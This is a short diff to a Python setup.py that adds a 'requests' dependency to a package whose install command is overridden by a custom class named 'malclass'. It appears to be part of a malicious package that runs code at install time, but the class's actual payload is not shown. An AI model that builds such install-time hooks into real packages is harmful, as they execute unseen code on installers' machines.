@@ -7,6 +7,9 @@ import subprocess
 from setuptools import setup
 from setuptools.command.install import install
 
+REQUIRED = [
+    'requests'
+]
 
 class malclass(install):
     def run(self):
@@ -19,6 +22,7 @@ class malclass(install):
 
 
 setup(
+    install_requires=REQUIRED,
     cmdclass={
         "install": malclass
     }
